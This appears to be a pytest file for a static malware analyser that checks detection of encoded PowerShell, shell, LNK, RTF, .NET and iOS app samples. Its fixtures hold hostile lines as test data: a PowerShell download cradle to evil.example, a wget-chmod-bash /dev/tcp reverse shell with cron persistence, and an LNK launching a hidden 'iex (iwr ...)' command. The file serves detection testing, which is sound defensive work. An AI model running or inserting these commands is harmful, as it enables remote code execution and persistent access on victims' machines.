import base64
import struct

from chimera_static.analyze import analyze
from chimera_static.plugins.dotnet import _user_strings
from chimera_static.plugins.lnk import HEADER, analyze_lnk


def run(tmp_path, name, data):
    path = tmp_path / name
    path.write_bytes(data)
    return analyze(str(path), file_name=name, ember=False, verify_signature=False)


def ids(result):
    return {f["id"] for f in result["findings"]}


def test_powershell_encoded_layers_are_decoded(tmp_path):
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"
    enc = base64.b64encode(inner.encode("utf-16-le")).decode()
    script = f"$x = 1\nInvoke-Expression 'a'\npowershell.exe -NoP -W Hidden -EncodedCommand {enc}\n"
    r = run(tmp_path, "a.ps1", script.encode())
    assert r["type"]["format"] == "script:powershell"
    assert r["source"]["layers"][0]["method"] == "base64 -EncodedCommand"
    assert "DownloadString" in r["source"]["layers"][0]["text"]
    assert {"script_download_cradle", "script_encoded_powershell", "script_hidden_window",
            "script_encoded_layers"} <= ids(r)
    assert "http://evil.example/a.ps1" in r["script"]["iocs"]["urls"]
    assert r["coverage"]["complete"] is False
    assert "rule-only" in r["coverage"]["failed_stages"]


def test_shell_reverse_shell_and_cron(tmp_path):
    script = b"#!/bin/sh\nwget http://1.2.3.4/x -O /tmp/x\nchmod +x /tmp/x\n" \
             b"bash -i >& /dev/tcp/10.9.9.9/4444 0>&1\n(crontab -l; echo '* * * * * /tmp/x') | crontab -\n"
    r = run(tmp_path, "x.sh", script)
    assert r["script"]["language"] == "shell"
    assert {"script_reverse_shell", "script_cron_persistence", "script_chmod_exec",
            "script_download_cradle"} <= ids(r)


def test_benign_script_has_no_script_findings(tmp_path):
    r = run(tmp_path, "hello.py", b"import sys\n\ndef main():\n    print('hello')\n\nmain()\n")
    assert r["script"]["language"] == "python"
    assert not {i for i in ids(r) if i.startswith("script_")}
    assert r["source"]["text"].startswith("import sys")


def _lnk(target, args, icon):
    flags = 0x2 | 0x20 | 0x40 | 0x80
    header = HEADER + struct.pack("<II", flags, 0x20) + b"\x00" * 24 + struct.pack("<IiIH", 0, 0, 7, 0) + b"\x00" * 10
    base = target.encode() + b"\x00"
    info = struct.pack("<IIIIIII", 0x1C + len(base), 0x1C, 1, 0, 0x1C, 0, 0) + base
    strings = b"".join(struct.pack("<H", len(s)) + s.encode("utf-16-le") for s in (args, icon))
    return header + info + strings + b"\x00\x00\x00\x00"


def test_lnk_parsing_and_findings():
    data = _lnk("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                " " * 300 + "-w hidden -c iex (iwr http://evil.example/p)", "C:\\Windows\\System32\\imageres.dll")
    info, findings = analyze_lnk(data)
    assert info["target"].endswith("powershell.exe")
    assert info["show_command"] == "minimized"
    assert info["icon"].endswith("imageres.dll")
    got = {f["id"] for f in findings}
    assert {"lnk_launches_interpreter", "lnk_long_arguments", "lnk_minimized",
            "lnk_script_download_cradle"} <= got


def test_lnk_through_analyzer(tmp_path):
    data = _lnk("C:\\Windows\\System32\\cmd.exe", "/c start calc", "")
    r = run(tmp_path, "invoice.pdf.lnk", data)
    assert r["type"]["format"] == "lnk"
    assert r["lnk"]["arguments"] == "/c start calc"
    assert "lnk_launches_interpreter" in ids(r)


def test_rtf_equation_object(tmp_path):
    cls = b"Equation.3\x00"
    ole1 = struct.pack("<II", 0x501, 2) + struct.pack("<I", len(cls)) + cls + struct.pack("<II", 0, 0) \
        + struct.pack("<I", 8) + b"\x01" * 8
    rtf = b"{\\rtf1{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}{\\*\\objdata " + ole1.hex().encode() + b"}}}"
    r = run(tmp_path, "doc.rtf", rtf)
    assert r["type"]["format"] == "rtf"
    assert r["rtf"]["objects"][0]["class"] == "Equation.3"
    assert {"rtf_exploit_class", "rtf_objects", "rtf_objupdate"} <= ids(r)


def test_dotnet_user_string_heap():
    def entry(s):
        raw = s.encode("utf-16-le") + b"\x00"
        return bytes([len(raw)]) + raw
    heap = b"\x00" + entry("http://c2.example/gate.php") + entry("ab") + entry("cmd.exe /c whoami")
    assert _user_strings(heap) == ["http://c2.example/gate.php", "cmd.exe /c whoami"]


def test_ipa_is_identified_as_an_ios_app_and_listed_like_a_zip(tmp_path):
    import io
    import zipfile

    from chimera_static.identify import identify

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("Payload/Notes.app/Info.plist", b"<plist/>")
        z.writestr("Payload/Notes.app/Notes", b"\xcf\xfa\xed\xfe" + b"\0" * 60)
    info = identify(buf.getvalue(), "Notes.ipa")
    assert info["format"] == "ipa" and info["platform"] == "ios"
    result = run(tmp_path, "Notes.ipa", buf.getvalue())
    assert result["type"]["format"] == "ipa" and result["ipa"]["members"] == 2
